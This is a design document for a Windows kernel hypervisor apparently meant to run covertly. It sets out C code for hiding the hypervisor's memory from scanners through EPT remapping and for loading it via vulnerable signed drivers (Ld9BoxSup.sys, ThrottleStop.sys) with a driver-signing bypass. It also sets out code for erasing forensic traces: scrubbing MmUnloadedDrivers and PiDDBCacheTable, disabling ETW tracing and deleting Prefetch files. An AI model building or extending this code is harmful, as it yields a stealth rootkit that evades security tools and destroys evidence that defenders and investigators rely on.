# OMBRA Hypervisor: memhv-Style Memory Hiding Design

**Date:** 2025-12-27
**Status:** Approved for Implementation
**Reference:** https://github.com/SamuelTulach/memhv

---

## Executive Summary

Port memory hiding and virtualization techniques from memhv (AMD SVM) to OMBRA (Intel VMX) using existing EPT primitives. The implementation is minimal because OMBRA already has all required building blocks.

**Key Insight:** memhv's NPT (Nested Page Tables) maps 1:1 to Intel's EPT (Extended Page Tables). Same concept, different vendor terminology.

---

## Section 1: EPT Self-Hiding

### Concept

Remap hypervisor physical pages to a blank (zeroed) page in EPT. Guest reads return zeros, but execution still works because EPT permissions allow X without R.

```
Before:  GPA 0x1000 → HPA 0x1000 (HV code)     [R=1, W=0, X=1]
After:   GPA 0x1000 → HPA 0x5000 (blank page)  [R=0, W=0, X=1]
```

Memory scanners read zeros. HV code executes normally because CPU fetches use a different path than data reads.

### memhv Reference

```cpp
// memhv/driver/SVM.cpp - NPT permission setup
void VirtualizeProcessor(...) {
    // Sets up NPT with blank page remapping
    // Pages marked execute-only where supported
}
```

### OMBRA Implementation

**Existing functions (no changes needed):**

```c
// ept.c:45-61 - Already implemented
bool EptSupportsExecuteOnly(void);

// ept.c:64-70 - Already implemented
U32 EptGetSafeExecutePermission(void);

// ept.c:844-898 - Already implemented
OMBRA_STATUS EptMapGuestToHost(EPT_STATE* ept, U64 gpa, U64 hpa, U32 perms, U8 memType);
```

**New wrapper function to add:**

```c
// Add to ept.c after EptMapGuestToHost

/**
 * EptProtectSelf - Hide hypervisor memory from guest reads
 *
 * Remaps all HV pages to point to a blank (zeroed) page.
 * Guest reads return zeros, execution still works via X permission.
 *
 * @param ept           EPT state pointer
 * @param hvPhysBase    HV physical base address (from HV_INIT_PARAMS)
 * @param hvPhysSize    HV physical size in bytes (from HV_INIT_PARAMS)
 * @param blankPagePhys Blank page physical address (from HV_INIT_PARAMS)
 * @return OMBRA_STATUS
 */
OMBRA_STATUS EptProtectSelf(
    EPT_STATE* ept,
    U64 hvPhysBase,
    U64 hvPhysSize,
    U64 blankPagePhys
)
{
    U64 addr;
    U32 permissions;
    OMBRA_STATUS status;

    // Get execute-only if supported, otherwise R+X fallback
    permissions = EptGetSafeExecutePermission();

    INFO("EPT: Self-protecting HV range 0x%llx - 0x%llx (blank=0x%llx)",
         hvPhysBase, hvPhysBase + hvPhysSize, blankPagePhys);

    // Remap each 4KB page to the blank page
    for (addr = hvPhysBase; addr < hvPhysBase + hvPhysSize; addr += PAGE_SIZE) {
        status = EptMapGuestToHost(
            ept,
            addr,           // Guest physical (where guest thinks HV is)
            blankPagePhys,  // Host physical (what guest actually reads)
            permissions,    // Execute-only or R+X
            EPT_MEMORY_TYPE_WB
        );

        if (OMBRA_FAILED(status)) {
            ERROR("EPT: Failed to protect page 0x%llx", addr);
            return status;
        }
    }

    INFO("EPT: Self-protection complete (%llu pages)", hvPhysSize / PAGE_SIZE);
    return OMBRA_SUCCESS;
}
```

**Declaration to add to ept.h:**

```c
// Add to ept.h public API section
OMBRA_STATUS EptProtectSelf(
    EPT_STATE* ept,
    U64 hvPhysBase,
    U64 hvPhysSize,
    U64 blankPagePhys
);
```

### Call Site

In `entry.c`, call `EptProtectSelf()` after EPT initialization but before vmlaunch:

```c
// entry.c - VirtualizeProcessor or equivalent
OMBRA_STATUS VirtualizeProcessor(HV_INIT_PARAMS* params) {
    // ... VMCS setup ...

    // Initialize EPT with identity map
    status = EptInitialize(&vcpu->ept);
    if (OMBRA_FAILED(status)) return status;

    // === NEW: Self-protection before going live ===
    status = EptProtectSelf(
        &vcpu->ept,
        params->HvPhysBase,
        params->HvPhysSize,
        params->BlankPagePhys
    );
    if (OMBRA_FAILED(status)) return status;

    // ... vmlaunch ...
}
```

### Why This Works

1. **EPT split happens automatically** - `EptMapGuestToHost()` calls `EptSplitLargePage()` internally
2. **INVEPT issued automatically** - `EptMapGuestToHost()` invalidates TLB
3. **Execute-only detection built-in** - `EptGetSafeExecutePermission()` checks MSR

---

## Section 2: PE Header Preservation via Parameters

### Concept

The loader (usermode) knows where it mapped the HV. It passes this info to the HV via boot parameters. The HV uses these addresses for self-protection.

### memhv Reference

memhv's loader allocates memory, maps the driver, then passes addresses through a custom entry mechanism. We do the same via `HV_INIT_PARAMS`.

### OMBRA Implementation

**Modify shared/types.h:**

```c
// Add to HV_INIT_PARAMS structure
typedef struct _HV_INIT_PARAMS {
    // Existing fields...
    U64 Reserved1;
    U64 Reserved2;

    // === NEW: Self-protection parameters ===
    U64 HvPhysBase;      // Physical address where HV is mapped
    U64 HvPhysSize;      // Size of HV in bytes (rounded to page)
    U64 BlankPagePhys;   // Physical address of zeroed page for hiding

} HV_INIT_PARAMS, *PHV_INIT_PARAMS;
```

**Loader modifications (pe_mapper.c or hv_loader.c):**

```c
// After mapping HV, before calling entry point
BOOL PrepareHvParams(HV_INIT_PARAMS* params, PVOID mappedBase, SIZE_T mappedSize) {
    // Get physical address of mapped HV
    params->HvPhysBase = GetPhysicalAddress(mappedBase);
    params->HvPhysSize = ALIGN_UP(mappedSize, PAGE_SIZE);

    // Allocate blank page (single 4KB page of zeros)
    PVOID blankPage = AllocateContiguousMemory(PAGE_SIZE);
    if (!blankPage) return FALSE;

    RtlZeroMemory(blankPage, PAGE_SIZE);
    params->BlankPagePhys = GetPhysicalAddress(blankPage);

    return TRUE;
}
```

### Physical Address Acquisition

The loader uses the vulnerable driver's IOCTLs for physical address translation:

```c
// Using Ld9BoxSup.sys capabilities
U64 GetPhysicalAddress(PVOID virtualAddress) {
    // SUP_IOCTL_PAGE_LOCK or equivalent
    // Returns physical address for given virtual
    return SupDrvTranslateAddress(virtualAddress);
}

PVOID AllocateContiguousMemory(SIZE_T size) {
    // SUP_IOCTL_CONT_ALLOC or equivalent
    // Returns virtually contiguous, physically contiguous memory
    return SupDrvAllocContiguous(size);
}
```

---

## Section 3: Ephemeral BYOVD Loading

### Concept

The vulnerable drivers (Ld9BoxSup.sys, ThrottleStop.sys) are only needed to:
1. Get kernel code execution
2. Map the hypervisor
3. Call the HV entry point

Once the HV is running in VMX root, the drivers serve no purpose. Unload them immediately.

### memhv Reference

memhv's Entry() function is synchronous - by the time it returns, all CPUs are virtualized:

```cpp
// memhv/driver/Entry.cpp
void Entry() {
    Memory::PreparePages();
    // ...
    VirtualizeAllProcessors();  // SYNCHRONOUS - waits for all CPUs
    // When we get here, HV is fully running
}

// memhv/driver/Utils.cpp
void ExecuteOnEachProcessor(CALLBACK callback) {
    for (ULONG i = 0; i < ProcessorCount; i++) {
        KeSetSystemAffinityThread(1ULL << i);
        callback();  // Runs on CPU i, waits for completion
        KeRevertToUserAffinityThread();
    }
}
```

**Key Insight:** No signal/flag needed. When DrvLdrLoad() returns, virtualization is complete.

### OMBRA Implementation

**Loader flow (hv_loader.c):**

```c
BOOL LoadHypervisor(void) {
    BOOL success = FALSE;

    // 1. Load vulnerable drivers
    if (!LoadSupDrv()) goto cleanup;
    if (!LoadThrottleStop()) goto cleanup;  // For -618 bypass

    // 2. Bypass -618 error (driver signing)
    if (!BypassDriverSigningError()) goto cleanup;

    // 3. Map hypervisor into kernel
    if (!MapHypervisor(&hvBase, &hvSize)) goto cleanup;

    // 4. Prepare parameters with physical addresses
    HV_INIT_PARAMS params = {0};
    if (!PrepareHvParams(&params, hvBase, hvSize)) goto cleanup;

    // 5. Call HV entry point - THIS IS SYNCHRONOUS
    // When this returns, ALL CPUs are virtualized
    if (!CallHvEntry(&params)) goto cleanup;

    // 6. === IMMEDIATE CLEANUP - HV is now running ===
    // We no longer need the vulnerable drivers
    success = TRUE;

cleanup:
    // ALWAYS unload drivers, even on failure
    // On success: HV is running, drivers are forensic liability
    // On failure: Clean up our mess

    UnloadThrottleStop();
    UnloadSupDrv();

    return success;
}
```

**Critical: Synchronous Entry**

OMBRA's entry point must be synchronous like memhv:

```c
// entry.c
OMBRA_STATUS HvEntry(PHV_INIT_PARAMS params) {
    OMBRA_STATUS status;

    // Validate parameters
    if (!params) return OMBRA_STATUS_INVALID_PARAMETER;

    // Store params globally for per-CPU access
    g_HvParams = params;

    // Virtualize ALL processors synchronously
    // This broadcasts to all CPUs and waits for each
    status = VirtualizeAllProcessors();

    // When we return here, every CPU is in VMX root
    return status;
}

OMBRA_STATUS VirtualizeAllProcessors(void) {
    // Run VirtualizeProcessor on each CPU, wait for completion
    KeIpiGenericCall(VirtualizeProcessorCallback, (ULONG_PTR)g_HvParams);

    // IPI is synchronous - all CPUs have been virtualized
    return g_VirtualizationStatus;
}
```

### Why No Signal Needed

```
Timeline:

  T0: Loader calls DrvLdrLoad(hvEntry, &params)
  T1: HvEntry() called in kernel context
  T2: VirtualizeAllProcessors() broadcasts IPI to all CPUs
  T3: Each CPU enters VMX root, sets up VMCS, executes vmlaunch
  T4: VirtualizeAllProcessors() returns (all CPUs done)
  T5: HvEntry() returns to DrvLdrLoad()
  T6: DrvLdrLoad() returns to loader
  T7: Loader proceeds to cleanup (HV is guaranteed running)
```

The IPI mechanism is inherently synchronous. No race condition exists.

---

## Section 4: Comprehensive Cleanup

### Concept

After unloading drivers, erase all forensic traces:
1. MmUnloadedDrivers - kernel's unloaded driver history
2. PiDDBCacheTable - driver database cache
3. ETW buffers - Event Tracing for Windows logs
4. Prefetch files - Windows Prefetch/SuperFetch

### Implementation

**Cleanup order matters - do ETW first (live buffers), then static artifacts:**

```c
// cleanup.c

VOID PerformForensicCleanup(void) {
    // 1. ETW - must be done while we have kernel access
    CleanupEtwBuffers();

    // 2. MmUnloadedDrivers - remove our entries
    CleanupMmUnloadedDrivers(L"Ld9BoxSup.sys");
    CleanupMmUnloadedDrivers(L"ThrottleStop.sys");

    // 3. PiDDBCacheTable - remove driver database entries
    CleanupPiDDBCacheTable(L"Ld9BoxSup.sys");
    CleanupPiDDBCacheTable(L"ThrottleStop.sys");

    // 4. Prefetch - delete from usermode after driver unload
    // This is done from loader.exe after cleanup returns
}
```

**MmUnloadedDrivers cleanup:**

```c
VOID CleanupMmUnloadedDrivers(PCWSTR driverName) {
    // MmUnloadedDrivers is a circular buffer of UNLOADED_DRIVER structs
    // Find entry by name, zero it out

    PUNLOADED_DRIVERS unloadedDrivers = GetMmUnloadedDrivers();
    PULONG lastIndex = GetMmLastUnloadedDriver();

    for (ULONG i = 0; i < MI_UNLOADED_DRIVERS; i++) {
        if (unloadedDrivers[i].Name.Buffer &&
            _wcsicmp(unloadedDrivers[i].Name.Buffer, driverName) == 0) {

            // Zero the entry
            RtlZeroMemory(&unloadedDrivers[i], sizeof(UNLOADED_DRIVER));
        }
    }
}
```

**PiDDBCacheTable cleanup:**

```c
VOID CleanupPiDDBCacheTable(PCWSTR driverName) {
    // PiDDBCacheTable is an RTL_AVL_TABLE
    // Find entry by timestamp/name hash, remove it

    PRTL_AVL_TABLE cacheTable = GetPiDDBCacheTable();
    PERESOURCE lock = GetPiDDBLock();

    ExAcquireResourceExclusiveLite(lock, TRUE);

    // Iterate table, find matching entry, remove
    PPIDDBCACHE_ENTRY entry = RtlEnumerateGenericTableAvl(cacheTable, TRUE);
    while (entry) {
        if (_wcsicmp(entry->DriverName.Buffer, driverName) == 0) {
            RtlDeleteElementGenericTableAvl(cacheTable, entry);
            break;
        }
        entry = RtlEnumerateGenericTableAvl(cacheTable, FALSE);
    }

    ExReleaseResourceLite(lock);
}
```

**ETW cleanup:**

```c
VOID CleanupEtwBuffers(void) {
    // Disable relevant ETW providers that might have logged our activity
    // This requires finding active trace sessions and flushing/stopping them

    // Target providers:
    // - Microsoft-Windows-Kernel-Process
    // - Microsoft-Windows-Kernel-File
    // - Microsoft-Windows-Kernel-Registry

    // Method: Iterate EtwpLoggerContext list, disable tracing
    // Note: This is invasive - only do if absolutely necessary
}
```

**Usermode Prefetch cleanup (in loader after cleanup):**

```c
// Run from loader.exe after driver unload
void CleanupPrefetch(void) {
    // Delete prefetch files that might reference our drivers
    // Location: C:\Windows\Prefetch\

    DeleteFileW(L"C:\\Windows\\Prefetch\\LD9BOXSUP.SYS-*.pf");
    DeleteFileW(L"C:\\Windows\\Prefetch\\THROTTLESTOP.SYS-*.pf");
    DeleteFileW(L"C:\\Windows\\Prefetch\\LOADER.EXE-*.pf");
}
```

---

## Implementation Order

1. **Phase 1: Parameters** (30 min)
   - Add fields to HV_INIT_PARAMS
   - Modify loader to populate them
   - Test parameter passing

2. **Phase 2: EptProtectSelf** (1 hour)
   - Add function to ept.c
   - Add declaration to ept.h
   - Call from entry.c before vmlaunch
   - Test with memory scanner

3. **Phase 3: Ephemeral Loading** (1 hour)
   - Verify entry point is synchronous
   - Add immediate driver unload after entry returns
   - Test that HV survives driver unload

4. **Phase 4: Cleanup** (2 hours)
   - Implement MmUnloadedDrivers cleanup
   - Implement PiDDBCacheTable cleanup
   - Implement ETW cleanup (optional, high risk)
   - Implement Prefetch cleanup
   - Test with forensic tools

---

## Verification Checklist

- [ ] HV runs after Ld9BoxSup.sys unloaded
- [ ] Memory scan of HV range returns zeros
- [ ] HV code still executes correctly
- [ ] MmUnloadedDrivers has no entry for our drivers
- [ ] PiDDBCacheTable has no entry for our drivers
- [ ] No ETW events logged for driver load
- [ ] No Prefetch files exist for our binaries

---

## Risk Assessment

| Feature | Risk | Mitigation |
|---------|------|------------|
| Execute-only EPT | Low | Fallback to R+X if not supported |
| Driver unload | Medium | Verify IPI is truly synchronous |
| MmUnloadedDrivers | Low | Standard technique, well understood |
| PiDDBCacheTable | Medium | Requires correct offset/version handling |
| ETW cleanup | High | May crash if done incorrectly, optional |
| Prefetch cleanup | Low | Simple file deletion |

---

## Dependencies

- Working EPT implementation (exists)
- Working BYOVD loader (exists)
- Physical address translation via IOCTL (exists)
- Contiguous memory allocation via IOCTL (exists)

---

## References

- memhv: https://github.com/SamuelTulach/memhv
- Intel SDM Vol 3C: EPT, Execute-only pages
- Windows Internals: MmUnloadedDrivers, PiDDBCacheTable
- OMBRA ept.c: Lines 45-70 (execute-only), 844-898 (remapping)
